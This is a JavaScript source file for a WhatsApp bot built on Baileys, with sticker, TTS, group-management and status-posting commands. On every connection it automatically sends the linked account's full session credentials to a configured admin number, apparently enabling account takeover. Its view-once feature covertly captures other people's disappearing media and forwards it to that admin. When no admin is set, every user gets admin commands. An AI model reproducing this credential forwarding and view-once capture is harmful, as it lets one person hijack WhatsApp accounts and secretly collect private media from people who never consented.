/**
 * ============================================================================
 * WHATSAPP BOT - MAIN LOGIC
 * ============================================================================
 * All bot logic, command handling, and state management.
 * Structure:
 *   1. Imports & Configuration
 *   2. State Management
 *   3. UI Style Constants
 *   4. Utility Helpers
 *   5. Session Management
 *   6. Feature Handlers
 *   7. Command Handler
 *   8. Main Bot Logic
 * ============================================================================
 */

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  downloadMediaMessage,
  getContentType
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ============================================================================
// 1. IMPORTS & CONFIGURATION
// ============================================================================

const SESSION_DIR = process.env.SESSION_DIR
  ? path.join(process.env.SESSION_DIR, 'auth')
  : path.join(__dirname, 'sessions', 'auth');

const STATE_FILE = process.env.SESSION_DIR
  ? path.join(process.env.SESSION_DIR, 'state.json')
  : path.join(__dirname, 'sessions', 'state.json');

const BANNER_PATH = path.join(__dirname, 'assets', 'banner.jpg');
let BANNER_BUFFER = null;

const ADMIN_NUMBER = process.env.ADMIN_NUMBER || '';

// ============================================================================
// 2. STATE MANAGEMENT
// ============================================================================

let sock = null;
let callbacks = {};
let currentNumber = null;
let isStopping = false;
let hasRequestedCode = false;
let botJid = null;

let pausedChats = new Set();
let welcomeEnabled = new Set();
let goodbyeEnabled = new Set();
let viewOnceEnabled = false;
let customWelcome = {};
let autoDownload = false;

function loadState() {
  try {
    if (fs.existsSync(STATE_FILE)) {
      const data = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
      pausedChats = new Set(data.pausedChats || []);
      welcomeEnabled = new Set(data.welcomeEnabled || []);
      goodbyeEnabled = new Set(data.goodbyeEnabled || []);
      viewOnceEnabled = data.viewOnceEnabled || false;
      customWelcome = data.customWelcome || {};
      autoDownload = data.autoDownload || false;
      console.log('[State] Loaded.');
    }
  } catch (e) {
    console.error('[State] Load error:', e.message);
  }
}

function saveState() {
  try {
    fs.mkdirSync(path.dirname(STATE_FILE), { recursive: true });
    fs.writeFileSync(
      STATE_FILE,
      JSON.stringify(
        {
          pausedChats: [...pausedChats],
          welcomeEnabled: [...welcomeEnabled],
          goodbyeEnabled: [...goodbyeEnabled],
          viewOnceEnabled,
          customWelcome,
          autoDownload
        },
        null,
        2
      ),
      'utf8'
    );
  } catch (e) {
    console.error('[State] Save error:', e.message);
  }
}

function loadBanner() {
  try {
    if (fs.existsSync(BANNER_PATH)) {
      BANNER_BUFFER = fs.readFileSync(BANNER_PATH);
      console.log('[Banner] Loaded:', BANNER_PATH, `(${BANNER_BUFFER.length} bytes)`);
    } else {
      console.warn('[Banner] Not found at', BANNER_PATH);
    }
  } catch (e) {
    console.error('[Banner] Load error:', e.message);
  }
}

// ============================================================================
// 3. UI STYLE CONSTANTS
// ============================================================================

const UI = {
  box: (title, icon = '🤖') =>
    `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ${icon}  *${title}*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯`,
  divider: '━━━━━━━━━━━━━━━━━━━━━━━',
  section: (name, icon = '📌') =>
    `\n━━━━━━━━━━━━━━━━━━━━━━━\n  ${icon}  *${name}*\n━━━━━━━━━━━━━━━━━━━━━━━`,
  row: (label, value) => `│ ${String(label).padEnd(10)} : ${value}`,
  footer: (text) => `\n╰━━━━━━━━━━━━━━━━━━━━╯\n   _${text}_`
};

// ============================================================================
// 4. UTILITY HELPERS
// ============================================================================

function isAdmin(senderJid) {
  if (!ADMIN_NUMBER) return true;
  const num = (senderJid || '').split('@')[0].split(':')[0];
  return num === ADMIN_NUMBER;
}

function isPaused(jid) {
  return pausedChats.has('ALL') || pausedChats.has(jid);
}

async function withTyping(jid, fn) {
  try {
    await sock.sendPresenceUpdate('composing', jid);
    await fn();
  } finally {
    try { await sock.sendPresenceUpdate('paused', jid); } catch (e) {}
  }
}

async function withRecording(jid, fn) {
  try {
    await sock.sendPresenceUpdate('recording', jid);
    await fn();
  } finally {
    try { await sock.sendPresenceUpdate('paused', jid); } catch (e) {}
  }
}

async function sendWithBanner(jid, caption) {
  try {
    if (BANNER_BUFFER) {
      const ext = path.extname(BANNER_PATH).toLowerCase();
      const mimetype =
        ext === '.png' ? 'image/png' :
        ext === '.webp' ? 'image/webp' :
        'image/jpeg';

      await sock.sendMessage(jid, {
        image: BANNER_BUFFER,
        caption,
        mimetype
      });
    } else {
      await sock.sendMessage(jid, { text: caption });
    }
  } catch (e) {
    console.error('[Banner] Send error:', e.message);
    try { await sock.sendMessage(jid, { text: caption }); } catch (e2) {}
  }
}

function extractText(msg) {
  const m = msg.message;
  if (!m) return '';
  return (
    m.conversation ||
    m.extendedTextMessage?.text ||
    m.imageMessage?.caption ||
    m.videoMessage?.caption ||
    ''
  );
}

// ============================================================================
// 5. SESSION MANAGEMENT
// ============================================================================

async function sendSessionBackup(adminJid) {
  try {
    if (!fs.existsSync(SESSION_DIR)) {
      await sock.sendMessage(adminJid, { text: '⚠️ No session files found.' });
      return;
    }
    const files = fs.readdirSync(SESSION_DIR).filter((f) => f.endsWith('.json'));
    if (!files.length) {
      await sock.sendMessage(adminJid, { text: '⚠️ No session files yet.' });
      return;
    }
    const bundle = {};
    for (const f of files) {
      bundle[f] = JSON.parse(fs.readFileSync(path.join(SESSION_DIR, f), 'utf8'));
    }
    const buffer = Buffer.from(JSON.stringify(bundle, null, 2));
    await sock.sendMessage(adminJid, {
      document: buffer,
      mimetype: 'application/json',
      fileName: `wa-session-${Date.now()}.json`,
      caption: `🔐 Session Backup\nNumber: +${currentNumber}\nTime: ${new Date().toISOString()}\n\nKeep safe.`
    });
    console.log('[Session] Backup sent to admin.');
  } catch (e) {
    console.error('[Backup] Error:', e.message);
  }
}

function restoreSessionFromFile(jsonPath) {
  try {
    if (!fs.existsSync(jsonPath)) return false;
    const bundle = JSON.parse(fs.readFileSync(jsonPath, 'utf8'));
    fs.mkdirSync(SESSION_DIR, { recursive: true });
    for (const [filename, content] of Object.entries(bundle)) {
      fs.writeFileSync(
        path.join(SESSION_DIR, filename),
        JSON.stringify(content, null, 2),
        'utf8'
      );
    }
    console.log('[Session] Restored from file.');
    return true;
  } catch (e) {
    console.error('[Restore] Error:', e.message);
    return false;
  }
}

// ============================================================================
// 6. FEATURE HANDLERS
// ============================================================================

async function tryCaptureViewOnce(msg, from) {
  try {
    const content = msg.message;
    const wrappers = ['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension'];
    let inner = null;
    for (const w of wrappers) {
      if (content?.[w]?.message) {
        inner = content[w].message;
        break;
      }
    }
    if (!inner) return false;

    const mediaType = inner.imageMessage
      ? 'imageMessage'
      : inner.videoMessage
      ? 'videoMessage'
      : inner.audioMessage
      ? 'audioMessage'
      : null;
    if (!mediaType) return false;

    const fakeMsg = { key: msg.key, message: { [mediaType]: inner[mediaType] } };
    const buffer = await downloadMediaMessage(fakeMsg, 'buffer', {}, {
      logger: pino({ level: 'silent' }),
      reuploadRequest: sock.updateMediaMessage
    });

    if (ADMIN_NUMBER) {
      const adminJid = `${ADMIN_NUMBER}@s.whatsapp.net`;
      const senderNum = (msg.key.participant || from).split('@')[0];
      const caption = `📸 View-Once Captured\nFrom: +${senderNum}\nType: ${mediaType}`;
      if (mediaType === 'imageMessage') {
        await sock.sendMessage(adminJid, { image: buffer, caption });
      } else if (mediaType === 'videoMessage') {
        await sock.sendMessage(adminJid, { video: buffer, caption });
      } else {
        await sock.sendMessage(adminJid, {
          audio: buffer,
          mimetype: 'audio/ogg',
          ptt: true
        });
      }
    }
    return true;
  } catch (e) {
    console.error('[VO] Error:', e.message);
    return false;
  }
}

async function postToStatus(quotedMsg) {
  try {
    const statusJid = 'status@broadcast';
    const content = quotedMsg.message;
    const type = getContentType(content);

    let payload = {};
    if (type === 'conversation' || type === 'extendedTextMessage') {
      payload = {
        text: content.conversation || content.extendedTextMessage?.text || '',
        backgroundColor: '#1F2C33',
        font: 2
      };
    } else if (type === 'imageMessage') {
      const buf = await downloadMediaMessage(quotedMsg, 'buffer', {}, {
        logger: pino({ level: 'silent' }),
        reuploadRequest: sock.updateMediaMessage
      });
      payload = { image: buf, caption: content.imageMessage?.caption || '' };
    } else if (type === 'videoMessage') {
      const buf = await downloadMediaMessage(quotedMsg, 'buffer', {}, {
        logger: pino({ level: 'silent' }),
        reuploadRequest: sock.updateMediaMessage
      });
      payload = { video: buf, caption: content.videoMessage?.caption || '' };
    } else {
      return false;
    }

    await sock.sendMessage(statusJid, payload, {
      broadcast: true,
      statusJidList: []
    });
    return true;
  } catch (e) {
    console.error('[Status] Error:', e.message);
    return false;
  }
}

async function sendWelcome(groupJid, participants) {
  try {
    const meta = await sock.groupMetadata(groupJid);
    const groupName = meta.subject || 'the group';

    if (BANNER_BUFFER) {
      try {
        await sock.sendMessage(groupJid, {
          image: BANNER_BUFFER,
          caption: `╭━━━━━━━━━━━━━━━━━━━━╮
┃   👋  *NEW MEMBER*   ┃
╰━━━━━━━━━━━━━━━━━━━━╯

_Welcome to the family!_`
        });
      } catch (e) {
        console.error('[Welcome] Banner failed:', e.message);
      }
    }

    for (const jid of participants) {
      const num = jid.split('@')[0];
      const custom = customWelcome[groupJid];
      const text = custom
        ? custom.replace(/@user/g, `@${num}`).replace(/@group/g, groupName)
        : `╭────────────────────
│ 📌 *${groupName}*
╰────────────────────

Hello @${num}!
You've joined the group.

*Please:*
│ ✅ Read the rules
│ ✅ Be respectful
│ ✅ No spam or links

━━━━━━━━━━━━━━━━━━━━━━━
  _Type *.help* to see commands_`;

      await sock.sendMessage(groupJid, { text, mentions: [jid] });
    }
  } catch (e) {
    console.error('[Welcome] Error:', e.message);
  }
}

async function sendGoodbye(groupJid, participants) {
  try {
    const meta = await sock.groupMetadata(groupJid);
    const groupName = meta.subject || 'the group';

    if (BANNER_BUFFER) {
      try {
        await sock.sendMessage(groupJid, {
          image: BANNER_BUFFER,
          caption: `╭━━━━━━━━━━━━━━━━━━━━╮
┃   👋  *MEMBER LEFT*   ┃
╰━━━━━━━━━━━━━━━━━━━━╯

_We'll miss you._`
        });
      } catch (e) {}
    }

    for (const jid of participants) {
      const num = jid.split('@')[0];
      const text = `╭────────────────────
│ 📌 *${groupName}*
╰────────────────────

@${num} has left the group.

━━━━━━━━━━━━━━━━━━━━━━━
  _Wishing you the best!_`;

      await sock.sendMessage(groupJid, { text, mentions: [jid] });
    }
  } catch (e) {
    console.error('[Goodbye] Error:', e.message);
  }
}

// ============================================================================
// 7. COMMAND HANDLER
// ============================================================================

async function handleCommand(msg, from, senderJid, rawText) {
  const text = rawText.trim();
  const cmd = text.toLowerCase();
  const parts = cmd.split(' ');
  const base = parts[0];
  const args = parts.slice(1);
  const admin = isAdmin(senderJid);
  const isGroup = from.endsWith('@g.us');

  const publicCmds = [
    '.help', '.menu', '.ping', '.id', '.myid', '.time', '.uptime',
    '.sticker', '.s', '.toimg', '.tts', '.voice', '.getpp'
  ];
  const adminCmds = [
    '.status', '.backup', '.restore', '.logout', '.pause', '.resume', '.pausestatus',
    '.welcome', '.goodbye', '.setwelcome', '.tagall', '.hidetag', '.kick', '.promote', '.demote',
    '.mute', '.unmute', '.groupinfo', '.vo', '.admin', '.restart', '.poststatus', '.autodl'
  ];

  if (adminCmds.includes(base) && !admin) {
    await withTyping(from, () =>
      sock.sendMessage(from, {
        text: `${UI.box('ACCESS DENIED', '🔒')}\n\nSorry, this command is restricted to the admin.`
      })
    );
    return;
  }

  if (base === '.help' || base === '.menu') {
    const help = `${UI.box('BOT MENU', '🤖')}

━━━━━━━━━━━━━━━━━━━━━━━
  📌  *GENERAL*
━━━━━━━━━━━━━━━━━━━━━━━
│ .help      • show menu
│ .ping      • check alive
│ .id        • your JID
│ .myid      • your number
│ .time      • server time
│ .uptime    • bot uptime

━━━━━━━━━━━━━━━━━━━━━━━
  🎨  *MEDIA*
━━━━━━━━━━━━━━━━━━━━━━━
│ .sticker   • img → sticker
│ .toimg     • sticker → img
│ .tts       • text → voice
│ .voice     • reply → voice
│ .getpp     • profile pic

━━━━━━━━━━━━━━━━━━━━━━━
  👮  *ADMIN ONLY*
━━━━━━━━━━━━━━━━━━━━━━━
│ .status    • bot status
│ .backup    • save session
│ .restore   • load session
│ .logout    • disconnect
│ .restart   • reboot bot

━━━━━━━━━━━━━━━━━━━━━━━
  ⏸️  *PAUSE CONTROL*
━━━━━━━━━━━━━━━━━━━━━━━
│ .pause         • mute here
│ .resume        • unmute here
│ .pause all     • mute all
│ .resume all    • unmute all
│ .pausestatus   • show state

━━━━━━━━━━━━━━━━━━━━━━━
  👥  *GROUP CONTROL*
━━━━━━━━━━━━━━━━━━━━━━━
│ .welcome on/off
│ .goodbye on/off
│ .setwelcome <text>
│ .tagall <msg>
│ .hidetag <msg>
│ .kick @user
│ .promote @user
│ .demote @user
│ .mute / .unmute
│ .groupinfo

━━━━━━━━━━━━━━━━━━━━━━━
  📸  *SPECIAL*
━━━━━━━━━━━━━━━━━━━━━━━
│ .vo on/off      • view-once
│ .autodl on/off  • auto DL
│ .poststatus     • → my status

━━━━━━━━━━━━━━━━━━━━━━━
  ⚙️  *INFO*
━━━━━━━━━━━━━━━━━━━━━━━
│ Admin  : ${ADMIN_NUMBER ? '+' + ADMIN_NUMBER : 'not set'}
│ Uptime : ${Math.floor(process.uptime() / 60)} min
│ Prefix : .

╰━━━━━━━━━━━━━━━━━━━━╯
   _Powered by Baileys_`;

    await withTyping(from, () => sendWithBanner(from, help));
    return;
  }

  if (base === '.ping') {
    const start = Date.now();
    const txt = `${UI.box('PONG', '🏓')}

│ Status  : ✅ online
│ Latency : ${Date.now() - start} ms
│ Uptime  : ${Math.floor(process.uptime())} s

╰━━━━━━━━━━━━━━━━━━━━╯
   _Bot is healthy_`;
    await withTyping(from, () => sendWithBanner(from, txt));
    return;
  }

  if (base === '.id' || base === '.myid') {
    const num = senderJid.split('@')[0].split(':')[0];
    await withTyping(from, () =>
      sock.sendMessage(from, {
        text: `${UI.box('YOUR INFO', '🆔')}

│ Number   : +${num}
│ User JID : ${senderJid}
│ Chat JID : ${from}`
      })
    );
    return;
  }

  if (base === '.time') {
    await withTyping(from, () =>
      sock.sendMessage(from, {
        text: `${UI.box('SERVER TIME', '🕐')}

│ ${new Date().toUTCString()}`
      })
    );
    return;
  }

  if (base === '.uptime') {
    const s = process.uptime();
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    await withTyping(from, () =>
      sock.sendMessage(from, {
        text: `${UI.box('UPTIME', '⏱️')}

│ Running : ${h}h ${m}m
│ Status  : ${botJid ? '✅ connected' : '❌ offline'}`
      })
    );
    return;
  }

  if (base === '.status') {
    const s = process.uptime();
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const txt = `${UI.box('BOT STATUS', '📊')}

━━━━━━━━━━━━━━━━━━━━━━━
  🔌  *CONNECTION*
━━━━━━━━━━━━━━━━━━━━━━━
│ Status   : ${botJid ? '✅ online' : '❌ offline'}
│ Number   : +${currentNumber || 'N/A'}
│ Uptime   : ${h}h ${m}m

━━━━━━━━━━━━━━━━━━━━━━━
  ⚙️  *FEATURES*
━━━━━━━━━━━━━━━━━━━━━━━
│ Paused     : ${pausedChats.size} chat(s)
│ View-once  : ${viewOnceEnabled ? '✅ ON' : '❌ OFF'}
│ Auto-DL    : ${autoDownload ? '✅ ON' : '❌ OFF'}
│ Welcome    : ${welcomeEnabled.size} group(s)

━━━━━━━━━━━━━━━━━━━━━━━
  👤  *ADMIN*
━━━━━━━━━━━━━━━━━━━━━━━
│ ${ADMIN_NUMBER ? '+' + ADMIN_NUMBER : 'not set'}

━━━━━━━━━━━━━━━━━━━━━━━
  🕐  _Reported at_
  ${new Date().toUTCString()}`;

    await withTyping(from, () => sendWithBanner(from, txt));
    return;
  }

  if (base === '.sticker' || base === '.s') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted) {
      await withTyping(from, () => sock.sendMessage(from, { text: '❌ Reply to an image or video.' }));
      return;
    }
    const img = quoted.imageMessage;
    const vid = quoted.videoMessage;
    if (!img && !vid) {
      await withTyping(from, () => sock.sendMessage(from, { text: '❌ Must be image or video.' }));
      return;
    }
    try {
      await withTyping(from, async () => {
        const mType = img ? 'imageMessage' : 'videoMessage';
        const mContent = img || vid;
        const fakeMsg = {
          key: {
            remoteJid: from,
            id: msg.message.extendedTextMessage.contextInfo.stanzaId,
            fromMe: false
          },
          message: { [mType]: mContent }
        };
        const buf = await downloadMediaMessage(fakeMsg, 'buffer', {}, {
          logger: pino({ level: 'silent' }),
          reuploadRequest: sock.updateMediaMessage
        });
        await sock.sendMessage(from, { sticker: buf });
      });
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ Failed. Try a smaller file.' });
    }
    return;
  }

  if (base === '.toimg') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    const stickerMsg = quoted?.stickerMessage;
    if (!stickerMsg) {
      await withTyping(from, () => sock.sendMessage(from, { text: '❌ Reply to a sticker.' }));
      return;
    }
    try {
      await withTyping(from, async () => {
        const fakeMsg = {
          key: {
            remoteJid: from,
            id: msg.message.extendedTextMessage.contextInfo.stanzaId,
            fromMe: false
          },
          message: { stickerMessage: stickerMsg }
        };
        const buf = await downloadMediaMessage(fakeMsg, 'buffer', {}, {
          logger: pino({ level: 'silent' }),
          reuploadRequest: sock.updateMediaMessage
        });
        await sock.sendMessage(from, { image: buf, caption: '🎨 *Converted to image*' });
      });
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ Failed.' });
    }
    return;
  }

  if (base === '.tts' || base === '.voice') {
    let targetText = args.join(' ');
    if (!targetText) {
      const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
      targetText = quoted?.conversation || quoted?.extendedTextMessage?.text || '';
    }
    if (!targetText) {
      await withTyping(from, () =>
        sock.sendMessage(from, { text: '❌ Provide text or reply to a message.' })
      );
      return;
    }
    try {
      const url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(
        targetText
      )}&tl=en&client=tw-ob`;
      const res = await fetch(url);
      const buf = Buffer.from(await res.arrayBuffer());
      if (!buf || buf.length === 0) throw new Error('Empty audio buffer');
      await withRecording(from, () =>
        sock.sendMessage(from, { audio: buf, mimetype: 'audio/mp4', ptt: true })
      );
    } catch (e) {
      console.error('[TTS]', e.message);
      await sock.sendMessage(from, { text: '❌ TTS failed.' });
    }
    return;
  }

  if (base === '.getpp') {
    let target = from;
    const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentioned?.length) target = mentioned[0];
    try {
      const url = await sock.profilePictureUrl(target, 'image');
      await sock.sendMessage(from, { image: { url }, caption: '📷 *Profile picture*' });
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ No profile picture available.' });
    }
    return;
  }

  // --- Pause / Resume ---
  if (base === '.pause') {
    if (args[0] === 'all') {
      pausedChats.add('ALL');
      saveState();
      await sock.sendMessage(from, {
        text: `${UI.box('GLOBAL PAUSE', '⏸️')}\n\nBot is now silent everywhere.`
      });
      return;
    }
    pausedChats.add(from);
    saveState();
    await sock.sendMessage(from, {
      text: `${UI.box('PAUSED', '⏸️')}\n\nBot is silent in this chat.`
    });
    return;
  }
  if (base === '.resume') {
    if (args[0] === 'all') {
      pausedChats.delete('ALL');
      saveState();
      await sock.sendMessage(from, {
        text: `${UI.box('RESUMED', '▶️')}\n\nBot is active everywhere.`
      });
      return;
    }
    pausedChats.delete(from);
    saveState();
    await sock.sendMessage(from, {
      text: `${UI.box('RESUMED', '▶️')}\n\nBot is active in this chat.`
    });
    return;
  }
  if (base === '.pausestatus') {
    const g = pausedChats.has('ALL');
    const l = pausedChats.has(from);
    const state = g ? '🌍 Global pause ON' : l ? '⏸️ This chat paused' : '▶️ Active';
    await sock.sendMessage(from, {
      text: `${UI.box('PAUSE STATUS', '📋')}\n\n│ ${state}`
    });
    return;
  }

  // --- Welcome / Goodbye toggles ---
  if (base === '.welcome') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    if (args[0] === 'on') {
      welcomeEnabled.add(from);
      saveState();
      await sock.sendMessage(from, { text: `${UI.box('WELCOME ON', '✅')}` });
    } else if (args[0] === 'off') {
      welcomeEnabled.delete(from);
      saveState();
      await sock.sendMessage(from, { text: `${UI.box('WELCOME OFF', '❌')}` });
    } else {
      await sock.sendMessage(from, { text: 'Usage: .welcome on/off' });
    }
    return;
  }
  if (base === '.goodbye') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    if (args[0] === 'on') {
      goodbyeEnabled.add(from);
      saveState();
      await sock.sendMessage(from, { text: `${UI.box('GOODBYE ON', '✅')}` });
    } else if (args[0] === 'off') {
      goodbyeEnabled.delete(from);
      saveState();
      await sock.sendMessage(from, { text: `${UI.box('GOODBYE OFF', '❌')}` });
    } else {
      await sock.sendMessage(from, { text: 'Usage: .goodbye on/off' });
    }
    return;
  }
  if (base === '.setwelcome') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    const custom = text.replace(/^\.setwelcome\s+/i, '');
    if (!custom) {
      await sock.sendMessage(from, { text: 'Usage: .setwelcome <text>  (@user, @group)' });
      return;
    }
    customWelcome[from] = custom;
    saveState();
    await sock.sendMessage(from, {
      text: `${UI.box('SAVED', '✅')}\n\nCustom welcome message set.`
    });
    return;
  }

  // --- Tag / Kick ---
  if (base === '.tagall' || base === '.hidetag') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    try {
      const meta = await sock.groupMetadata(from);
      const mentions = meta.participants.map((p) => p.id);
      const msgText = args.join(' ') || '📢 Attention everyone!';
      if (base === '.hidetag') {
        await sock.sendMessage(from, { text: msgText, mentions });
      } else {
        const list = mentions.map((j) => `│ @${j.split('@')[0]}`).join('\n');
        const txt = `${UI.box('ANNOUNCEMENT', '📢')}

${msgText}

━━━━━━━━━━━━━━━━━━━━━━━
${list}
╰━━━━━━━━━━━━━━━━━━━━╯`;
        await sock.sendMessage(from, { text: txt, mentions });
      }
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ Failed.' });
    }
    return;
  }
  if (base === '.kick' || base === '.promote' || base === '.demote') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid;
    if (!mentioned?.length) {
      await sock.sendMessage(from, { text: `❌ Mention someone to ${base.slice(1)}.` });
      return;
    }
    try {
      const action = base === '.kick' ? 'remove' : base === '.promote' ? 'promote' : 'demote';
      await sock.groupParticipantsUpdate(from, mentioned, action);
      await sock.sendMessage(from, {
        text: `${UI.box(action.toUpperCase(), '✅')}`
      });
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ Failed. Bot must be admin.' });
    }
    return;
  }
  if (base === '.mute' || base === '.unmute') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    try {
      await sock.groupSettingUpdate(from, base === '.mute' ? 'announcement' : 'not_announcement');
      await sock.sendMessage(from, {
        text: base === '.mute' ? '🔇 *Group muted*' : '🔊 *Group unmuted*'
      });
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ Failed.' });
    }
    return;
  }
  if (base === '.groupinfo') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    try {
      const meta = await sock.groupMetadata(from);
      const admins = meta.participants
        .filter((p) => p.admin)
        .map((p) => `│ +${p.id.split('@')[0]}`)
        .join('\n');
      const txt = `${UI.box('GROUP INFO', '📋')}

│ Name    : ${meta.subject}
│ ID      : ${meta.id}
│ Members : ${meta.participants.length}
│ Admins  : ${meta.participants.filter((p) => p.admin).length}
│ Created : ${new Date(meta.creation * 1000).toUTCString().split(',')[0]}

━━━━━━━━━━━━━━━━━━━━━━━
  👑  *ADMINS*
━━━━━━━━━━━━━━━━━━━━━━━
${admins}`;
      await sock.sendMessage(from, { text: txt });
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ Failed.' });
    }
    return;
  }

  // --- Special ---
  if (base === '.vo') {
    if (args[0] === 'on') {
      viewOnceEnabled = true;
      saveState();
      await sock.sendMessage(from, {
        text: `${UI.box('VO CAPTURE', '📸')}\n\n│ Status : ✅ ON`
      });
    } else if (args[0] === 'off') {
      viewOnceEnabled = false;
      saveState();
      await sock.sendMessage(from, {
        text: `${UI.box('VO CAPTURE', '📸')}\n\n│ Status : ❌ OFF`
      });
    } else {
      await sock.sendMessage(from, { text: 'Usage: .vo on/off' });
    }
    return;
  }
  if (base === '.autodl') {
    if (args[0] === 'on') {
      autoDownload = true;
      saveState();
      await sock.sendMessage(from, {
        text: `${UI.box('AUTO-DOWNLOAD', '⬇️')}\n\n│ Status : ✅ ON`
      });
    } else if (args[0] === 'off') {
      autoDownload = false;
      saveState();
      await sock.sendMessage(from, {
        text: `${UI.box('AUTO-DOWNLOAD', '⬇️')}\n\n│ Status : ❌ OFF`
      });
    } else {
      await sock.sendMessage(from, { text: 'Usage: .autodl on/off' });
    }
    return;
  }
  if (base === '.poststatus') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    const quotedKey = msg.message.extendedTextMessage?.contextInfo;
    if (!quoted || !quotedKey) {
      await withTyping(from, () =>
        sock.sendMessage(from, {
          text: `${UI.box('POST STATUS', '📤')}

Reply to a message with *.poststatus* to publish it to your WhatsApp status.`
        })
      );
      return;
    }
    try {
      const fakeQuoted = {
        key: {
          remoteJid: from,
          id: quotedKey.stanzaId,
          fromMe: quotedKey.participant === botJid,
          participant: quotedKey.participant
        },
        message: quoted
      };
      const ok = await postToStatus(fakeQuoted);
      if (ok) {
        await withTyping(from, () =>
          sock.sendMessage(from, {
            text: `${UI.box('POSTED', '✅')}\n\nVisible on your status for the next 24 hours.`
          })
        );
      } else {
        await withTyping(from, () =>
          sock.sendMessage(from, { text: '❌ Only text, images, videos supported.' })
        );
      }
    } catch (e) {
      console.error('[Status]', e);
      await sock.sendMessage(from, { text: '❌ Status post failed.' });
    }
    return;
  }
  if (base === '.backup') {
    await withTyping(from, () => sendSessionBackup(from));
    return;
  }
  if (base === '.restore') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    const doc = quoted?.documentMessage;
    if (!doc || !doc.fileName?.endsWith('.json')) {
      await sock.sendMessage(from, { text: '❌ Reply to a .json session file.' });
      return;
    }
    try {
      const fakeMsg = {
        key: {
          remoteJid: from,
          id: msg.message.extendedTextMessage.contextInfo.stanzaId,
          fromMe: false
        },
        message: { documentMessage: doc }
      };
      const buf = await downloadMediaMessage(fakeMsg, 'buffer', {}, {
        logger: pino({ level: 'silent' }),
        reuploadRequest: sock.updateMediaMessage
      });
      const tmp = path.join(os.tmpdir(), `restore-${Date.now()}.json`);
      fs.writeFileSync(tmp, buf);
      const ok = restoreSessionFromFile(tmp);
      fs.unlinkSync(tmp);

      if (ok) {
        await sock.sendMessage(from, { text: '✅ *Session restored. Restarting bot...*' });
        setTimeout(() => {
          stopBot();
          setTimeout(() => startBot(currentNumber, callbacks), 2000);
        }, 1500);
      } else {
        await sock.sendMessage(from, { text: '❌ *Restore failed.*' });
      }
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ Restore error.' });
    }
    return;
  }
  if (base === '.logout') {
    await sock.sendMessage(from, { text: '🚪 *Logging out...*' });
    try { await sock.logout(); } catch (e) {}
    stopBot();
    return;
  }
  if (base === '.restart') {
    await sock.sendMessage(from, { text: '🔄 *Restarting...*' });
    stopBot();
    setTimeout(() => startBot(currentNumber, callbacks), 2000);
    return;
  }
}

// ============================================================================
// 8. MAIN BOT LOGIC
// ============================================================================

async function startBot(phoneNumber, cbs) {
  callbacks = cbs || {};
  currentNumber = phoneNumber;
  isStopping = false;
  hasRequestedCode = false;

  loadState();
  loadBanner();
  fs.mkdirSync(SESSION_DIR, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
  const { version } = await fetchLatestBaileysVersion();
  const logger = pino({ level: 'silent' });

  sock = makeWASocket({
    version,
    logger,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger)
    },
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    generateHighQualityLinkPreview: true,
    syncFullHistory: false,
    markOnlineOnConnect: false,
    connectTimeoutMs: 60000,
    keepAliveIntervalMs: 30000,
    retryRequestDelayMs: 250
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && !sock.authState.creds.registered && !hasRequestedCode) {
      hasRequestedCode = true;
      try {
        await new Promise((r) => setTimeout(r, 500));
        const code = await sock.requestPairingCode(phoneNumber);
        console.log('[Bot] Pairing code:', code);
        callbacks.onPairingCode?.(code);
      } catch (err) {
        console.error('[Bot] Pairing error:', err.message);
        hasRequestedCode = false;
      }
    }

    if (connection === 'open') {
      console.log('[Bot] Connected!');
      botJid = sock.user?.id;
      callbacks.onConnected?.();
      if (ADMIN_NUMBER && currentNumber) {
        setTimeout(() => sendSessionBackup(`${ADMIN_NUMBER}@s.whatsapp.net`), 5000);
      }
    }

    if (connection === 'close') {
      if (isStopping) return;
      const code = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = code !== DisconnectReason.loggedOut;
      console.log('[Bot] Closed. Code:', code, 'Reconnect:', shouldReconnect);
      if (shouldReconnect) {
        setTimeout(() => startBot(currentNumber, callbacks), 2000);
      } else {
        callbacks.onDisconnected?.('logged_out');
      }
    }
  });

